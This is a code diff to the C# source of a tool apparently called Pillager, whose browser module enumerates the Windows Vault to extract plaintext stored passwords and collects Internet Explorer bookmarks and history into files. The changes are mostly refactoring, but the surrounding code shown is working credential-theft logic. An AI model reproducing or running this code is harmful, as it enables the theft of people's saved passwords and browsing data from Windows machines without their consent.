@@ -3,6 +3,7 @@ using Pillager.Helper;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -52,7 +53,7 @@ namespace Pillager.Browsers
             object GetVaultElementValue(IntPtr vaultElementPtr)
             {
                 object results;
-                object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
+                object partialElement = Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
                 FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
                 var partialElementType = partialElementInfo.GetValue(partialElement);
 
@@ -60,33 +61,33 @@ namespace Pillager.Browsers
                 switch ((int)partialElementType)
                 {
                     case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
-                        IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
-                        results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);
+                        IntPtr StringPtr = Marshal.ReadIntPtr(elementPtr);
+                        results = Marshal.PtrToStringUni(StringPtr);
                         break;
                     case 0: // VAULT_ELEMENT_TYPE == bool
-                        results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);
+                        results = Marshal.ReadByte(elementPtr);
                         results = (bool)results;
                         break;
                     case 1: // VAULT_ELEMENT_TYPE == Short
-                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
+                        results = Marshal.ReadInt16(elementPtr);
                         break;
                     case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
-                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
+                        results = Marshal.ReadInt16(elementPtr);
                         break;
                     case 3: // VAULT_ELEMENT_TYPE == Int
-                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
+                        results = Marshal.ReadInt32(elementPtr);
                         break;
                     case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
-                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
+                        results = Marshal.ReadInt32(elementPtr);
                         break;
                     case 5: // VAULT_ELEMENT_TYPE == Double
-                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));
+                        results = Marshal.PtrToStructure(elementPtr, typeof(Double));
                         break;
                     case 6: // VAULT_ELEMENT_TYPE == GUID
-                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));
+                        results = Marshal.PtrToStructure(elementPtr, typeof(Guid));
                         break;
                     case 12: // VAULT_ELEMENT_TYPE == Sid
-                        IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
+                        IntPtr sidPtr = Marshal.ReadIntPtr(elementPtr);
                         var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                         results = sidObject.Value;
                         break;
@@ -103,8 +104,6 @@ namespace Pillager.Browsers
             Int32 vaultCount = 0;
             IntPtr vaultGuidPtr = IntPtr.Zero;
             var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);
-
-            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);
 
             if ((int)result != 0)
             {
@@ -129,9 +128,9 @@ namespace Pillager.Browsers
             for (int i = 0; i < vaultCount; i++)
             {
                 // Open vault block
-                object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));
+                object vaultGuidString = Marshal.PtrToStructure(guidAddress, typeof(Guid));
                 Guid vaultGuid = new Guid(vaultGuidString.ToString());
-                guidAddress = (IntPtr)(guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));
+                guidAddress = (IntPtr)(guidAddress.ToInt64() + Marshal.SizeOf(typeof(Guid)));
                 IntPtr vaultHandle = IntPtr.Zero;
                 string vaultType;
                 if (vaultSchema.ContainsKey(vaultGuid))
@@ -164,8 +163,8 @@ namespace Pillager.Browsers
                     for (int j = 1; j <= vaultItemCount; j++)
                     {
                         // Begin fetching vault item...
-                        var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);
-                        structAddress = (IntPtr)(structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));
+                        var currentItem = Marshal.PtrToStructure(structAddress, VAULT_ITEM);
+                        structAddress = (IntPtr)(structAddress.ToInt64() + Marshal.SizeOf(VAULT_ITEM));
 
                         IntPtr passwordVaultItem = IntPtr.Zero;
                         // Field Info retrieval
@@ -196,7 +195,7 @@ namespace Pillager.Browsers
                         {
                             throw new Exception("Error occured while retrieving vault item. Error: 0x" + result.ToString());
                         }
-                        object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
+                        object passwordItem = Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
                         FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
                         IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
                         // Fetch the credential from the authenticator element
@@ -274,7 +273,6 @@ namespace Pillager.Browsers
                     Match match = Regex.Match(booktext, @"URL=(.*?)\n");
                     sb.AppendLine($"{url_file_path}");
                     sb.AppendLine($"\t{match.Value}");
-
                 }
             }
 
@@ -288,9 +286,9 @@ namespace Pillager.Browsers
             string passwords = IE_passwords();
             string books = IE_books();
             string history = IE_history();
-            File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
-            File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-            File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+            if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+            if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
+            if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
             Console.WriteLine("Files wrote to " + savepath);
         }
     }
